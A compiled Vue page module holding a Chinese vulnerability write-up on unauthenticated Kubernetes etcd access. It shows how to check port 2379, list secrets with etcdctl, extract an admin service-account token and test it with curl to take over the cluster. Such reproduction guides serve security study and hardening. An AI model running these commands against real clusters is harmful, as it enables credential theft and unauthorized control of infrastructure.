import{_ as d}from"./plugin-vue_export-helper-c27b6911.js";import{r as a,o as i,c as r,a as e,b as t,d as c,e as s}from"./app-58e4a7d6.js";const o={},l=s(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>etcd 是云原生架构中重要的基础组件。etcd 在微服务和 Kubernates 集群中不仅可以作为服务注册于发现，还可以作为 key-value 存储的中间件，为 k8s 集群提供底层数据存储，保存了整个集群的状态。</p><p>在 K8s 集群初始化后，etcd 默认就以 pod 的形式存在，可以执行如下命令进行查看，etcd 组件监听的端口为 2379，并且对外开放。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>kubectl get pods -A | grep etcd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在 etcd 的配置文件 /etc/kubernetes/manifests/etcd.yaml 中，--client-cert-auth 默认为 true，这意味着访问 etcd 服务需要携带 cert 进行认证。</p><p>如果目标在启动 etcd 的时候没有开启证书认证选项，且 2379 端口直接对外开放的话，则存在 etcd 未授权访问漏洞。</p>`,6),u={href:"https://github.com/etcd-io/etcd",target:"_blank",rel:"noopener noreferrer"},p=s(`<h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><h3 id="查看是否存在未授权访问" tabindex="-1"><a class="header-anchor" href="#查看是否存在未授权访问" aria-hidden="true">#</a> 查看是否存在未授权访问</h3><p>访问以下链接，查看是否存在未授权访问。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>https://your-ip:2379/version
-------------
返回如下则存在未授权访问：
{etcdserver: &quot;3.4.3&quot;, etcdcluster: &quot;3.4.0&quot;} 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>https://your-ip:2379/v2/keys
-------------
返回如下则存在未授权访问：
{&quot;action&quot;:&quot;get&quot;,&quot;node&quot;:{&quot;dir&quot;:true,&quot;nodes&quot;:...}}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="查找-token-接管集群" tabindex="-1"><a class="header-anchor" href="#查找-token-接管集群" aria-hidden="true">#</a> 查找 Token 接管集群</h3><p>由于 Service Account 关联了一套凭证，存储在 Secret 中。因此我们可以过滤 Secret，查找具有高权限的 Secret，然后获得其 token 接管 K8s 集群。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>#查找所有的 secret
./etcdctl --insecure-transport=false --insecure-skip-tls-verify --endpoints=https://your-ip:2379/ get / --prefix --keys-only|sort|uniq| grep secret
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>以 <code>/registry/secrets/kube-system/dashboard-admin-token-c7spp</code> 为例，查看指定 secret 保存的证书和 token：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>#查找指定 secret 保存的证书和 token
./etcdctl --insecure-transport=false --insecure-skip-tls-verify --endpoints=https://your-ip:2379/ get /registry/secrets/kube-system/dashboard-admin-token-c7spp
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>最终的 token 为 <code>token?</code> 和 <code>\\#kubernetes.io/service-account-token</code> 之间的部分。可以使用 curl 验证 token 的有效性：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>curl --header &quot;Authorization: Token&quot; -X GET https://your-ip:6443/api -k
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>然后，就可以使用 token 登录 dashboard 或者远程命令管理 K8s。</p>`,13);function v(h,m){const n=a("ExternalLinkIcon");return i(),r("div",null,[l,e("p",null,[t("etcdctl 下载地址："),e("a",u,[t("https://github.com/etcd-io/etcd"),c(n)])]),p])}const x=d(o,[["render",v],["__file","K8s etcd未授权访问.html.vue"]]);export{x as default};
